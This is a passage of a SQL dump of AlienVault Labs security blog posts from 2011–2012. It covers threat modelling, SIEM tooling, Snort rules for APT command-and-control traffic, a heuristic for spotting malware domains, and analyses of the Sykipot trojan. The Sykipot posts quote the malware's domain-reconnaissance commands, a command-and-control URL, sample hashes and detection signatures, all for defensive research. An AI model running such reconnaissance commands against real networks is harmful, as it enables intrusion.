chain was first constructed, remain that way even after significantÂ maintenanceÂ ...At Least they Left the Locks Unbroken…Imagine this: One day, a bank is robbed, all the money is taken, gone. The Bank carries out an investigation into the investigation, and discovers that none of its security was compromised. No locks were picked, no alarms triggered, the vault itself was never breached,however, the money is just gone, the how and why of it doesn’t matter here. The official report concludes that since none of their security measures were defeated, they are perfectly adequate, and will not be changed.This seems insane, right? And yet we see stories that invoke this every day; systems being compromised (usually ridiculously simple oversight) in a manner that the designers of the system had never accounted for, yet because it renders the existing security systems irrelevant, the system itself is judged to still be ‘fundamentally sound’.Most commonly (and to be fair to the designers of systems involved in real-world examples of this scenario) the weakness exploited by the attackers is often not in the security system itself, but in how that system is implementedÂ in the wild. To the end user however, the details are irrelevant, a breach is a breach is a breach…Assuming a Sphere in a VacuumPhysics is complicated. Modelling believable physics simulation is very complicated - but at least you can leave out some factors. Modelling ActualÂ Real WorldÂ physics is extremely complicated - you can’t leave out any factors. PhysicistsÂ generally trying to express new discoveries realize that the mathematics and the outcome change a lot, depending on which of those factors apply. So to simplify things, they tend to baseline their mathematical descriptions of effects within the universe as describing the behavior when applied to a spher e, within a vacuum.Security acts kind of the same way - those external effects often have the most significant effect on our sphere; and yet we try to do threat modelling in a perfect vacuum.The Tunnel Vision of ExpertiseOne of the biggest traps of having large quantities of specialized knowledge in a specific domain, is that inevitably Â it adjusts your perception to fit the model of that knowledge..Remember that part about ‘if you design it as well as you are able’ ......Ask a cryptographer to assess the security of a cryptosystem, and he will likely talk about entropy, keyspace distribution and quality of moduli, stream versus block analytical differences, perhaps the issue of securre key management; rarely will the subject of how to protect one of the keyholders from divulging the keys under torture, arise as a possible threat to the cryptosystem. (yet, this is a threat that anyway, even with no cryptography knowledge could imagine, since in their perception of the issue, the non-cryptography data they have, far outweighs the cryptography data they have, in building their own mental model). In fact these ‘stupid’ approaches to cracking crypto both have nicknames from being real practises (Rubber Hose Cryptanalysis and Black Bag Cryptanalysis)Threat-Modelling ShadowboxingIt’s not surprising at this point, that if I have a single point to communicate in this article, is is that if you are doing your own Threat-Modelling, you’re doing Threat Modelling wrong. The perceptual bias is inherent, and focus will be on on the threat methods that the system is inherently designed to counter. The secure portions of the system will be either subverted or routed around by the insecure portions of the systemIn the past few weeks we’ve been covering the Sykipot Trojan here on Alienvault Labs, and a newly-minted version of it that hijacks military access smartcards, effectively bypassing what is, on paper, an extremely secure access system. The security of the entire system is brought to its knees, rendered null and void, by a threat that is completely absent in the threat modelling done on this system. The advanced cryptography used in the cards is not defeated, the authentication methods are not bypassed, indeed the integrity of the authentication method itself is a crucial factor for the attackers to maintain so that may act undetected, appearing to an outside observer to be a legitimate operator. Instead of attacking the smartcard authentication at its strongest point (the authentication mechanism) Sykipot instead hijacks the surrounding environment (the operating system) and attacks the oldest vector in the security handbook - the smartcard middlewar’s assumed trust of the host operating system.(Any good threat modelling methodology will in fact, place early emphasis on the inherent trust model and investigate exploitation of that model as the most likely place to find viable attack vectors).Attackers will always chose the path of least resistance, as defenders, we strive to raise the bar of the lowest common denominator of weakness, both in terms of their number and ease of exploitation - the battle in good security design is not to make unbeatable defenses, but to try and force your attacker to attack you in ways you are capable of mounting a sustained defense against. Medieval Castle design is a masterwork of this doctrine, location being one of the first considerations in a defensive configuration that provides attackers only a single, well-understand approach to attacking the bastion).And yet all the care and forethought in the design of your security, goes out the window, when threat modelling is applied only to the specificationÂ and not the implementation. The castle’s specification requires that the main drawbridge be at least three-feet thick, banded with iron and able to resist the impacts of the heaviest known battering rams ever constructucted, approachable only by a single lone road… meanwhile in a separate specification the castle’s sewers are required to be large enough to allow an average size adult to walk through them freely. The two authors of these specifications never meet, not communicate, before the castle is built.And yet, effective bypasses of defenses due to these details of implementation, are always met with irate rebuttals that the essential security mechanism remains secure; an argument that holds as much water as a bank manager arguing that, since his staff was tricked into handing over vast sums of money to criminals masquerading as Armored Car drivers, the extensive security of the bank’s vault and alarm systems are still intact. Criminals, by and large, are results-driven operators who have no particular interest in how their attack succeeded but only the success itself. It is only in the world of film and fiction where the ‘audacity of the crime’ and the pride of pulling off the ‘perfect heist’ is a driving factor. In the real world, the simplest and most effective methods win out - the goal is not to carry out a breach in a way that inspires awe and respect for its complexity and ingenuity, but to suceed, at any cost.And if it’s stupid, but successful.. It’s not stupid.So when considering the possibility of a threat vector, or the feasibility of a working exploit - take the following into account:What is the return on investment for successful implementation of this attack - If the rewards are greater than the resources required to implement it - it will be implemented if necessary. Even without taking into account the factor that all too often, individuals making the assessment that exploitation is non-trivial have very little experience in exploitation themselves, the driving factor is the complexity in relation to other available avenues. Don’t assess things as isolated factors, but by their place in the larger attack surface.Are you focusing on a particular part of and attack vector that may not be relevant at all? Could a change in an interdependent technology of configuration, make this ‘non-trivial’ weakness several orders of magnitude more trivial? A classic illustration of this from the cryptography world lies with symmetric ciphers, where the robustness of the cipher becomes irrelevant once the necessity of sharing the common without the availability of a secure channel - as the dynamics of implementation change, so does the triviality of the problem.Practical ConsiderationsLet’s conclude with a few practical examples of how to apply this mentality into security monitoring. When building out your SIEM program it is logical to start from the most important devices down - beginning with the security controls and moving on through infrastructure, critical systems and choke points of activity. Time and resource constraints often mean that ‘less important’ systems don’t get logged into the SIEM at all; perhaps that test server for your IT Support ticketing system doesn’t log to the SIEM, because after all, that doesn’t hold any critical data, or that cluster of VM’s that the admins use to test new builds of desktop images on: that would just be stupid logging everything from those…Well, in the words of one of my favorite security presentations from 2010 (“Why the Black Hats Always Win”), you don’t get to pick what is important on your network, your attackers do: the most important systems on your network are the ones that enable their goals. It’s worth considering taking a look into some of the more ‘stupid’ ways an attacker could reach their goals - like finding a collection of test tickets on that staging server, detailing logins and emergency credentials for more critical systems, or exploiting a 5-year old vulnerability on a forgotten Virtual machine that accidentally got autostarted with the latest reboot of the ESX server it resides on. Start taking stock of all the little ‘stupid things’ you know to exist in your infrastructure and business process and start bringing them into the security monitoring program.Consider that your organization’s assessment of system criticality may be inversely-proportional to the respective worth to an attacker; and instead consider your threat models from the bottom-up rather than the top-down.Because in hindsight after being breached, it will be “all the little stupid things that allowed it to happen” that will keep you awake at night.', '', '/blogs/labs-research/if-its-stupid-and-it-works-its-not-stupid');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (111, 'AlienVault Open Threat Exchange (AV-OTX) released!', 'Dominique Karg', 'February 22, 2012 ', 'We’re proud to announce the immediate availability of the first phase of our threat exchange platform. You can check the marketing text on the AlienVault main site.We’ll be releasing more detail on the inner workings as we go on, or if you can’t wait, just upgrade your OSSIM installation and have a look at the inner workings.Basically the system, at this point, gathers information about IP addresses external to your network or setup and relates them to events in the database, (count). This information, after making sure none of the defined networks or hosts are going to be leaked, is submitted through a secure communication channel on an hourly basis to the AlienVault servers.From that moment on the information is completely anonymous since no relation is stored on who submitted what.Sanity checks are performed on the data and it gets added to the Open Threat Exchange.This is just one example as how this platform can be used. The information is and will remain free for all users that opt-in to share data to enrich the platform; that is my personal commitment to you. Customers who have paid for the SIEM feed will get this data too without having to opt-in to sharing.Kudos to the entire lab team that has worked on it and also our devel guys who got this out on time :-)Enjoy!', '', '/blogs/labs-research/alienvault-open-threat-exchange-av-otx-released');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (112, 'Introducing the Alienvault Labs', 'Dominique Karg', 'February 22, 2012 ', 'We’re proud to present the new Alienvault Labs.This portal should unify research and development efforts made around the Alienvault SIEM and other security areas.For the launch we’ve reposted Jaime Blasco’s and DK’s complete blogs, along with some presentations and open source code. There’s more code to come and we’ve got some special plans for the upcoming OSSEC week.Stay tuned for more news, new Labs people to be joining us very soon and new code being ready to be uploaded.Enjoy!', 'releaselabs', '/blogs/labs-research/introducing-the-alienvault-labs');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (113, 'Some APT C&C traffic Snort rules', 'Jaime Blasco', 'February 14, 2012 ', 'Commandfive did a great job and published a research document that describes some APT C&C communication protocols http://www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf used on the SK Communications hack and other recent attacks.We have written some snort rules to detect the protocols described on the analysis.We have tested some of them with real traffic from samples but others are based only on the protocols descriptions.alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“APT QDIGIT PROTOCOL detected”; flow:to_server,established; content:”|51 31 39 21 00|”; depth:5; reference:url,www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf; classtype:trojan-activity; sid:3000004; rev:1;)alert tcp $HOME_NET any -> $EXTERNAL_NET [$HTTP_PORTS,12345] (msg:“APT UPDATE communicaction protocol detected”; flow:to_server,established; content:“X|2d|Session|3A|”; nocase; http_header; content:“X|2d|Status|3A|”; nocase; http_header; content:“X|2d|Size|3A|”; nocase; http_header; content:“X|2d|Sn|3A|”; nocase; http_header; content:“User|2d|Agent|3a| Mozilla|2f|4|2e|0 |28|compatible|3b| MSIE 6|2e|0|3b| Windows NT 5|2e|1|3b|SV1|3b|”; nocase; http_header; reference:url,www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf; classtype:trojan-activity; sid:3000005; rev:1;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“APT LURK communication protocol detected”; flow:established,to_server; content:”|4C 55 52 4B 30|”; depth:5; reference:url,www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf; classtype:trojan-activity; sid:3000006; rev:1;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“APT IP2B communicacion protocol detected”; flow:established,to_server; content:”|12 34 56 78 10 00 10 00|”; depth:8; content:”|00 18 09 07 20|”; distance:4; within:5; reference:url,www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf; classtype:trojan-activity; sid:3000007; rev:1;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“APT BB communication protocol detected”; flow:established,to_server; content:”|01 00 00 00|”; offset:4; content:”|01 04 01 00|”; distance:8; within:4; reference:url,www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf; classtype:trojan-activity; sid:3000008; rev:1;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“APT X-Shell 601 communication protocol detected”; flow:to_server,established; content:”|43 36 30 31|”; offset:16; depth:4; reference:url,www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf; classtype:trojan-activity; sid:3000009; rev:1;)The Backdoor.Murcy traffic is already covered by “ETPRO TROJAN Backdoor.Win32.Murcy.A Checkin”.The rules will be included on the EmergingThreats http://www.emergingthreats.net [no longer available] feed and Alienvault feed.', 'aptsnortcommandfivesk-hacksginaturescommand-and-control', '/blogs/labs-research/some-apt-cc-traffic-snort-rules');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (114, 'Detecting malware domains by syntax heuristics', 'Alberto Ortega', 'February 1, 2012 ', 'An important challenge we face when feeding our Open Source IP Reputation System is to differentiate between real threats and false positives.However, nothing in the universe is black or white. Each IP in the database has a reliability value from 1 to 10. That’s because in some special scenarios, an IP can be good and bad at the same time (e.g. shared hostings with malware or dynamic IPs).When we had a bunch of malicious domains pointing to malware IPs, we realized that most of them had something in common. Take a look at these 10 domains:ypyfp.com.twjlmjalzjk.gsewdkddr.mexzasuf.com.ptnnis.co.ukqzlx.co.zatuxs.com.uaupwcbab.twhkwytkey.peuzabfgqfk.myThey are similar in some way, aren’t they?This list of domains has been generated with downatool2, a tool that emulates the Conficker’s C&Cs domain generator. Several pieces of malware and bad guys are registering domains doing more or less the same, with similar algorithms and results.How do we distinct these kinds of malware domains against the rest only with syntax analysis?We need to keep in mind that detecting false domains with 100% accuracy is really quite difficult. We do not know if the domain is pointing to a legitimate site, and it is hard to design a perfect algorithm to match malware domains for all generators without some legitimate sites with weird domains getting swept up by mistake.Within part of our IP Reputation Engine, we’ve developed an algorithm that can check good detections / false positives with acceptable ratio. Simply put, it’s a Python library attached at the end of the article, along with more stuff.In the named domains we can see that they have a lot of consonant characters and only a few vocal characters (uzabfgqfk.my). This isn’t common in normal domains. To develop the algorithm, the first thing we did was study how many consonant characters followed has a domain, and if it has more than X, mark it as a malware domain.After that, we realized that removing common words (like “and”, “or”, “page”, “free”, ...) and then doing the same check could improve the detection ratio. This is because generated domains do not include human words. It helped us to quit some false positives too.In the real world.We are going to generate a huge list of possible malware domains with downatool2 and test the code with it.$ ./check_domain_heur.py domains_conficker.txt30696 / 5000061 per cent matchedWe have a 61% of domains detected as malicious only with syntax analysis. It isn’t bad, but what about false positives?Alexa bring us a big list with the most visited websites. We can presume that none of them is a malware domain, let’s try.$ ./check_domain_heur.py alexa.txt104643 / 100000010 per cent matchedWith this approach, we have a 10% of false positives. It isn’t perfect, but a 61% of successful matches against a 10% of false positives is, for now, quite respectable. We are still working to improve the algorithm and the list of common words as much as we can. Please note that currently, this should be considered more as a proof of concept than a stable release.', 'malwareheuristicsdomains', '/blogs/labs-research/detecting-malware-domains-by-syntax-heuristics');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (115, 'New Garage Tool: ClearCutter', 'Conrad Constantine', 'January 19, 2012 ', 'I’ve just finished committing the first alpha release of ClearCutterÂ to the Alienvault-Garage repository on GoogleCode. It’s a tool born of necessity, for anyone whose spent a good amount of time on those ‘SIEM pre-processing’ tasks, neck-deep in sed, grep,awk, uniq.Clearcutter (because it ‘clears a forest of logs’) is my work-in-progress combination tool for all those log pre-analysis tasks we here at Alienvault find ourselves doing repetitively. We figure if it’s useful to us, it will be just as useful to other people out there looking to add new device types into OSSIM and find the log entries they need to build effective correlation rules:Here’s a short planned feature listFind Individual Log messages in a log file - ever tried to find all the unique message types in a log sample? this will do it for you.Make constructing OSSIM collector plugins easier - assistance in writing regexp’s for OSSIM plugin SID entriesFind Sequences of Logs in a log file (complete behavioral actions) - need to find all the log messages that indicate a complete user session?Produce Sequence configs and process logs into sequence summariesTest OSSIM collector plugins against log samples - validate that you have a valid plugin config and show what gets parsed by what SIDProfile individual regex’s/SID’s against sample logs to see which consume most CPU time - solve those performance mysteries.You can find the alpha code for clearcutter hereÂ or check out viasvn coÂ http://alienvault-labs-garage.googlecode.com/svn/trunk/clearcutter alienvault-labs-garage-read-onlyCurrently only the first function is implemented,thoughÂ I’ll be updating this tool rather regularly in-between other things I’m working on, and I’m certainly interested in hearing back from people’s experiences with the accuracy and utility of clearcutter as it progresses. As it stands today, it’s not the fastest tool out there, but Donald Knuth tells me that Early Optimization is the root of all evil, right?', '', '/blogs/labs-research/new-garage-tool-clearcutter');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (116, 'Sykipot variant hijacks DOD and Windows smart cards', 'Jaime Blasco', 'January 12, 2012 ', 'Defenses of any sort, virtual or physical, are a means of forcing your attacker to attack you on your terms, not theirs. As we build more elaborate defenses within information security, we force our attacker’s hand. For instance, in many cases, implementing multi-factor authentication systems just forces the attacker to go after that system directly to achieve their goals. Take the breach at RSA, for example. It has been attributed to attackers who needed the SecurID information to go after their real targets in the defense industry.As we discussed, this malware has been used to launch targeted attacks via “spear phishing” campaigns against targets mainly in the US, since around 2007. According to our research, these attacks originate from servers in China with what appears to be the purpose of obtaining information from the defense sector: the same sector that makes extensive use of PC/SC x509 Smartcards for authentication.Smartcards have a long history of usage in the Defense Sector, for both physical and information access management, and historically have merely forced attackers to route around the smartcard authentication system through other, more vulnerable attack vectors.It should come as no surprise, then, that we recently discovered a variant of Sykipot with some new, interesting features that allow it to effectively hijack DOD and Windows smart cards. This variant, which appears to have been compiled in March 2011, has been seen in dozens of attack samples from the past year.Like we have shown with previous Sykipot attacks, the attackers use a spear phishing campaign to get their targets to open a PDF attachment which then deposits the Sykipot malware onto their machine (the attackers here took advantage of a zero-day exploit in Adobe). Then, unlike previous strains, the malware uses a keylogger to steal PINs for the cards. When a card is inserted into the reader, the malware then acts as the authenticated user and can access sensitive information. The malware is controlled by the attackers from the command & control center.Here is more detail on the attack:Smartcard accessThe ﬁrst one is that it creates a new thread with a keylogger routine. The code is very basic, it stores the window name and the keys pressed under a ﬁle named MSF5F0.dat on an unencrypted format, example:Title:Internet Explorerwww.google.esTitle:My ComputerIt uses the WIN32 APIʼs functions [GetKeyState, GetAsyncKeyState,GetForegroundWindow, GetWindowTextA].It also saves the information contained in the clipboard using the native functions:OpenClipboard, GetClipboardDataand CloseClipboard.This code is very similar to other pieces of APTʼs like:http://contagiodump.blogspot.com/2010/07/apt-activity-monitor-keylogger.htmlApart from this we found two more modules that attracted our attention. The ﬁrst one is capable of listing all the certificates that are stored on the windows key store:This next routine is called if the command “cl” is present on the conﬁg ﬁle fetched from the C&C.When you insert a smart card into a reader attached to a Windows computer, the certiﬁcate on the smart card is registered to the local certiﬁcate store on the client computer.The second one is even more interesting:It loads:C:\\Program Files\\ActivIdentity\\ActivClient\\acpkcs201.dll(a module that handles some of the functions related with ActivIdentityʼs ActivClient solution.)ActivClient is a smart card-based PKI authentication solution for compliance with:U.S. Government Smart Card Interoperability Specifications GSC-IS 2.1U.S. General Services Administration (GSA) Basic Services Interface (BSI)(In fact it is one of the platforms used to support the Department of Defense common access card - DoD CAC)This routine is called if the command “cm” is present on the conﬁg ﬁle fetched from the C&C:  So, the modus operandi of the attackers is listing the certificates present on the victimʼscomputer included the smartcards, stealing the PIN using the keylogger module and thenuse this information to log onto remote resources protected with certificates/smartcards.  To log onto protected resources they have implemented the command “krundll”, if the C&C sends that command, the victim receives a new dll that implements the required code to login using the certiﬁcate and the stolen PIN. This DLL implements the “LoginFunc” and “GetFunc”. These methods will contain all the code depending on the application used:  SummaryWe have seen how the attackers are implementing different techniques to bypass two-factor authentication with smartcard/PIN to access protected resources on the victimʼs network. By capturing the PIN for the smartcard and binding the certificate, malware can silently use the card to authenticate to secure resources, so long as the card remains physically present in the card reader. This is similar to what Mandiant described on the 2011 M-Trends report as a “Smart Card Proxy”. While trojans that have targeted smartcards are not new, there is obvious siginficance to the targeting of a particular smartcard system in wide deployment by the US DoD and other government agencies, particularly given the nature of the information the attackers seem to be targeting for exfiltration.ImplicationsAs defenses get better, attackers will continue to change their tactics to adapt, and as seen here, will hijack the very systems designed to provide more security, if necessary. An interesting by-product of this malware’s necessity of having the card physically present is that attackers can only leverage it for secure authentication to target systems, during times that the user them is physically present at the workstation, making unauthorized activity that much more difficult to discern from legitimate usage. Although smart cards are designed to provide a two factor system of ‘chip and pin’, again we see that true two-factor authentication is not possible without a physical component that is not accessible digitally.', '', '/blogs/labs-research/sykipot-variant-hijacks-dod-and-windows-smart-cards');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (117, 'Are the Sykipotâs authors obsessed with next generation US drones?', 'Jaime Blasco', 'December 20, 2011 ', 'For several weeks there has been a great deal of talk about the “undeclared global cyber war”. There have been accusations that China is stealing almost anything they choose and that they have a “shopping list” that gives priority to key industries like:Clean energy industryBiotechnologySemiconductorsInformation technologyAerospace technologyMedical technologyThis month, Lockheed Martin raised the alarm on an Adobe Reader zero-day exploit that was being exploited in the wild.  Once again the payload dropped was Sykipot, a known malware that has appeared several times in combination with zero-day exploits and has been used to launch targeted attacks since 2007. The list of known zero-day exploits used by Sykipot’s authors during these years is as following:CVEDateProductCVE-2007-06712007-02-02Microsoft ExcelCVE-2009-39572010-12-01Adobe ReaderCVE-2010-08062010-05-04Internet ExplorerCVE-2010-28832010-09-08Adobe ReaderCVE-2010-36542010-10-28Adobe Flash PlayerCVE-2011-24622011-12-06Adobe ReaderThe “drone” campaignThere have been a lot of different campaigns with different Command-And-Control servers. The modus operandi is simple, they send emails with a malicious attachment or link, sometimes using a zero-day exploit to key employees of different organizations.In most of the campaigns the malware dropped displays some document or media attractive to the victim. After analyzing most of the campaigns, we discovered a group of samples connecting to the same C&C server that attracted our attention because of the media displayed after the infection:As you can see, all the content is related with US UCAVs (unmanned combat air vehicle):http://www.airforce-technology.com/projects/x-45-ucav/http://www.airforce-technology.com/projects/boeing-x37/We can imagine that this campaign could target organizations related to technology used in this kind of vehicles like aerospace and military industries.Some of the mails used contain attachments with names like:X-37B Orbital Test Vehicle.scrX-45b.scrWith the information we collected it appears that this campaign has been running for months. The domain used for the C&C server was registered on 2011-03-04 and we detected two different campaigns with timestamps on 09/08/2011 and 09/26/2011.Here is the list of analyzed samples:MD5Creation DateCampaign Stringd978d8071c19a4aca13b4180d250f4db09/08/2011 13:16:19-help20110908425c0856e5aec8bdf91ac0cf5aec280504/19/2011 12:55:24\n09/08/2011 13:16:19-help20110908cb0ceb37e2eb11ea4ee5090a09fd8b4d09/26/2011 09:16:19-help201109266f8601931c450e1f79ae560f4de9866504/19/2011 12:55:24\n09/26/2011 09:16:40-help2011092623309fbec1b3a063415c00fbeb50ee6604/19/2011 12:55:24\n09/26/2011 09:16:40-help20110926e36a8ff79bc641530071da6c8b8f15d704/19/2011 12:55:24\n09/26/2011 09:16:40-help2011092645b8cb1b9aa3c22ff10a2a00deed82a604/19/2011 12:55:24\n09/08/2011 13:16:19-help20110908bf61f5d008c385b6342912784999874504/19/2011 12:55:24\n09/08/2011 13:16:19-help20110908248def2faa654efb0fb4c4d59475795704/19/2011 12:55:24\n09/08/2011 13:16:19-help2011090808883b00a3969db54bbfb7bb1a20b53109/08/2011 13:16:05-help201109085144c11008eae61f7c654794b00b119d04/19/2011 12:55:24\n09/08/2011 13:16:19-help20110908The trojan injects itself into Internet Explorer, Firefox or Outlook process memory and then connects to the C&C server, retrieving an encrypted configuration file with commands to execute on the victim’s system and then sends the results back to the C&C server. In this case the config file is as follow:C:\\DOCUME~1\\user\\CONFIG~1\\gthelp.tmp,0\n\niexplore\n\nfindpass2000\n\nprocess\n\nipconfig /all\n\nnet start\n\nnet view /domain\n\nnet group \"domain admins\" /domain\n\ntasklist /v\n\nnet localgroup administrators\n\ndir c:\\*.url /s\n\nsysteminfo\n\ntype c:\\boot.iniApart from this, the C&C mechanism permits the following actions:cmdshellrungetfileputfilekillprocessreboottimedoorTracing C&C serversAfter an analysis of the different domains used this year by Sykipot and the C&C headers and data, we discovered that they were using hacked servers mainly in the US to mask the real C&C server.It appears that they used well known public exploits to hack into US based servers and then install a software to proxy the connections between the infected systems and the real C&C server.We realized that most of the C&C servers were running a webserver called “Netbox” (http://www.netbox.cn) and most of them were using a self-signed certificate with the following subject:/C=US/ST=North Carolina/L=Salisbury/O=Internet Widgits Pty Ltd/OU=VeriSign Trust Network/CN=ITU Server/emailAddress=[email protected]After a short investigation on the Netbox webserver, we learnt that it is a windows based webserver that allows developers to compile and deploy ASP web applications into a stand-alone executable file.We also checked Shodan and discovered that there were only a couple of thousand servers running the webserver and nearly the 80% of the servers were located on China.With this information, we thought that there was a good chance to localize these servers on Chinese network ranges. So we began to search Netbox servers running SSL on port 443 with a certificate issued to [email protected] on the main Chinese ISP providers.After some time, we confirmed our suspicion and we found 7 ip addresses belonging to “China Unicom Beijing province network”  that matched our criteria.Six of them were pointing to the same webserver (same certificate, same headers, timestamps) so it appears that they are using that machines to proxy the connections as well but we don’t know if one of them was the last C&C server.Here is the certificate information:Download http://alienvault-labs-garage.googlecode.com/svn/trunk/Sykipot/cert1.txt [no longer available]There was another server serving a different certificate that seems to be pointing to a different C&C server: Download http://alienvault-labs-garage.googlecode.com/svn/trunk/Sykipot/cert2.txt [no longer available]Here is the Map with the active redirections (2011-12-17):As we can see, the malware authors are masquerading the C&C through US servers in order to make the connections less suspicious as well as using SSL certificates that contain a mail address from Lawrence Tech University ([email protected]).They are using the default common name on the certificate. I have seen this behavior in other malware’s C&C. In order to detect a remote site serving this kind of certificates is good to run the following IDS signature:alert tcp any 443 -> any any (msg:\"POLICY self-signed certificate default common name detected\"; flow:established,to_client; ssl_state: server_hello; content:\"|16|\"; content:\"|0b|\"; within:8; content:\"Internet Widgits Pty Ltd\"; within:400; classtype:bad-unknown; sid:11111111113; rev:8;)Apart from this rule, I think it is good to run the following rules for a while to detect the certificate serial number and other certificates that they can be serving using the [email protected] mail address:alert tcp any 443 -> any any (msg:\"MALWARE Sykipot certificate serial number detected\"; flow:established,to_client; ssl_state: server_hello; content:\"|16|\"; content:\"|0b|\"; within:8; content:\"|00 ec 32 09 67 c9 34 3f 50|\"; within:30; classtype:bad-unknown; sid:11111111112; rev:8;)alert tcp any 443 -> any any (msg:\"MALWARE Sykipot certificate subject emailAddress detected\"; flow:established,to_client; ssl_state: server_hello; content:\"|16|\"; content:\"|0b|\"; within:8; content:\"[email protected]\"; within:400; classtype:bad-unknown; sid:11111111113; rev:8;)Who is behind SykipotWe shouldn’t jump to assumptions but whoever is behind Sykipot is massively collecting information from targeted victims that covers dozens of industries.It’s true that the piece of malware isn’t too sophisticated, but it is related with at least six zero-day attacks that require skills and/or money. Anyway we have been seeing that “not too sophisticated malware” works, see Shady RAT for instance  that targeted organizations ranging from defense contractors to accounting firms.On the other hand, we have identified at least six Chinese ip addresses that are used to proxy or host the C&C servers. We also identified a tool that the Sykipot authors use to package and create campaigns:In some of the samples it contains some Chinese message errors.Apart from this, the “Netbox” webserver used in the C&C servers is mainly used by those who speak Chinese. In fact all the documentation to setup and learn the framework is only available in Mandarin.Most of the domains used on these campaigns are registered on Xinnet, a Chinese domain registrant. Also the information of the domain owners (names, addresses, etc) are from China (not very relevant).The origin of the tool seems to be from China, someone called LZX ([email protected]) but anyone could have gotten the code, and compiled it.The last piece of information is a string embedded in all of the Sykipot binaries: “19990817”  used for another layer of encryption. It can be the date “Aug 17, 1999”. The only relevant event on that date was a 7.6 magnitude earthquake that killed around 17000 people in Turkey (http://en.wikipedia.org/wiki/1999_%C4%B0zmit_earthquake).Someone has said that cyberwar does not exist?. Draw your own conclusions.', 'malwaresykipotchinacve-2011-2462drones', '/blogs/labs-research/are-the-sykipots-authors-obsessed-with-next-generation-us-drones');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (118, 'Another Sykipot sample likely targeting US federal agencies', 'Jaime Blasco', 'December 12, 2011 ', 'Last week Adobe issued an advisory on a zero-day vulnerability Â (CVE-2011-2462) that has been being used in targeted attacks, probably defense contractors.The payload used isÂ Sykipot, a know malware that has connections with several targeted attacks/0days during the past.During the analysis of this attack, I’ve found a new sample with a fresh command and control server (C&C).MD5:Â 4d979bb626e1e61cc4fc0cefefaa3ec7VirusTotal:Submission date:2011-12-12 00:39:51 (UTC)Result:25 /43 (58.1%)The binary drops a DLL:FileName: WSE4EF1.TMPMD5: 945FF23E9979A0867B7F3815BB0F9477Timestamp:Â 22/11/2011Original File Name: wship4.dll (IPv4 Helper DLL)The original malware scans the list of running process looking for outlook, iexplore or firefox. If found it injects the DLL into the process.\nAfter that, the binary will spawn a PDF file,FY 2012 Per Diem Rates - Effective October 1, 2011This file shows the continental United States “CONUS rates” for travelling expenses.The injected DLL will contactÂ XXXhksrv.hostdefence.net/asp/kys_allow_get.asp?name=getkys.kys to download an encrypted configuration file. Â This file contains several commands that the victim will execute on the sending the results back to the C&C server.Example of configuration file:iexplorefindpass2000processipconfig /allnetstat -anonet startnet view /domainnet group “domain admins” /domaintasklist /vnet localgroup administratorsdir c:\\*.url /sThe domain info is:Domain Name: hostdefence.netRegistrant:AmirhoseinAmirhosein Â  Â  Â  ([email protected])No 806 8th building YuLin City GuangXi ProvinceYu LinGuang Xi,537500CNTel. +86.7756853792Creation Date: 2011-11-14 15:35:24Expiration Date: 2012-11-14 15:35:24', 'malwaresykipotcve-2011-2462', '/blogs/labs-research/another-sykipot-sample-likely-targeting-us-federal-agencies');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (119, 'Easy entry to SIEM Correlation Rules with Policy Validation', 'Conrad Constantine', 'December 6, 2011 ', '“We’d love to do log correlation, but we just don’t know where to start!”If I had a dollar for every time I’ve heard this expressed, I’d ... have enough to buy everyone in the company a round of drinks..Start with what you knowFor most organizations, the amount of third-party technology they have deployed, far outweighs what was developed bespoke. Approaching log correlation by trying to level of mountain of technical information coming from these systems down to something meaningful is an incredibly daunting task, and all too often, is the approach people take to diving into correlation.Like so many problems in technology however, working from the desired result backwards, is almost always the correct approach. In the case of SIEM and log correlation, the end result is actionable information. You can only act on what you understand how to act upon, so start with what you know: your business. At the top level of your Security Program, should be your Security Policy, a broad set of guidelines for advising the construction of Process and Procedure for operating securely within the requirements of your business model.Now, assuming your policy was written for your org, and not just copied verbatim from “best practices”, you likely aren’t seeing a great number of violations of those policies on a daily basis, right? Well, with log correlation, we can put that to the test, in an exercise that gives us a good approach to getting into building correlation rules, with some simple steps:Choose an item in your Security PolicyDecide on an action that would violate that policyDetermine what devices would have visibility or record of those actions.Locate those log entries, determine what the pattern of logs would be when the violation occursBuild your first custom ruleOnce you start giving the policy-driven approach a try, the results are often enlightening and encouraging, and not necessarily in the way you’d think. I’ve seen a lot of people use the policy approach and see that their security policy is being violated thousands of times a day, and not necessarily in a manner that is actually a security issue: sometimes “Industry Best Practices” just don’t match up to how the organization actually operates the business legitimately. This is part of Risk Management though, and it doesn’t necessarily reflect that your practices are bad, just that your Security Policy doesn’t match up to the risk appetite of the organization itself.But just as often, you’ll be starting on a great source of directly actionable information; a series of alerts of things you *know* should not be happening within your Enterprise, that you most likely already have fairly well-established rectification procedures from.So give the ‘start with what you know’ approach a try, in security, it’s better to start out by doing a few things perfectly, than do a hundred things poorly. Starting out with what you should know best: your own business, and then slowly working out towards what you don’t, is the panic-free approach to moving the mountain.', '', '/blogs/labs-research/easy-entry-to-siem-correlation-rules-with-policy-validation');
